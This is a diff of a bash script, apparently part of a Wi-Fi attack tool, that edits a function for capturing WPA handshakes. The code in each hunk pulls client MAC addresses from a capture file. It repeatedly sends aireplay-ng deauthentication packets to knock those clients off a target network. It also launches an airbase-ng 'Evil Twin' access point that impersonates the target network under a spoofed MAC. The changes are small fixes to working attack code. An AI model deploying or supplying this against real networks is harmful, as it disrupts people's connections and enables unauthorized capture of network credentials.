@@ -544,7 +544,10 @@ fautocap()																#Deauth targets and collect handshakes
 	fi
 	while [ $DONE -z ] 2> /dev/null
 		do
-			TARGETS="$(cat $HOME/tmp-01.csv | grep Station -A 20 | grep : | cut -d ',' -f 1 | sort -u)"
+			if [ -f $HOME/tmp-01.csv ] 2> /dev/null
+				then
+					TARGETS="$(cat $HOME/tmp-01.csv | grep Station -A 20 | grep : | cut -d ',' -f 1 | sort -u)"
+			fi
 			if [ $DEPASS = "1" ] 2> /dev/null
 				then
 					if [ $POWERLIMIT -z ] 2> /dev/null
@@ -599,7 +602,7 @@ fautocap()																#Deauth targets and collect handshakes
 									echo
 									aireplay-ng -0 2 -a $BSSID -c $CLIENT $MON1 | grep sdvds&
 									sleep 1.8
-									echo $RED" [*] $GRN Deauth Client number $MACNUM: $CLIENT$RED Launched"
+									echo $RED" [*]$GRN Deauth Client number $MACNUM: $CLIENT$RED Launched"
 									sleep 0.5
 								done
 							sleep 3
@@ -623,7 +626,7 @@ fautocap()																#Deauth targets and collect handshakes
 											echo
 											aireplay-ng -0 3 -a $BSSID -c $CLIENT $MON2 | grep rvzsdb&
 											sleep 2.8
-											echo $RED" [*] $GRN Deauth Client number $MACNUM: $CLIENT$RED Launched"
+											echo $RED" [*]$GRN Deauth Client number $MACNUM: $CLIENT$RED Launched"
 											sleep 0.5
 										done
 									sleep 3
@@ -643,13 +646,14 @@ fautocap()																#Deauth targets and collect handshakes
 							FAKEMAC=${BSSID:0:12}'13:37'
 							gnome-terminal -t "Evil Twin $ESSID listening on $NIC2.." --geometry=100x20+0+600 -x airbase-ng -v -c $CHAN -e $ESSID -W 1 $BARG$CIPHER -a $FAKEMAC -i $MON2 -I 50 -F $HOME/tmpe $MON2&
 							sleep 2
+							MACNUM=0
 							for CLIENT in $TARGETS
 								do
 									MACNUM=$((MACNUM + 1))
 									echo
 									aireplay-ng -0 2 -a $BSSID -c $CLIENT $MON1 | grep rvzsdb&
 									sleep 1.8
-									echo $RED" [*] $GRN Deauth Client number $MACNUM: $CLIENT$RED Launched"
+									echo $RED" [*]$GRN Deauth Client number $MACNUM: $CLIENT$RED Launched"
 								done
 							sleep 6
 					fi
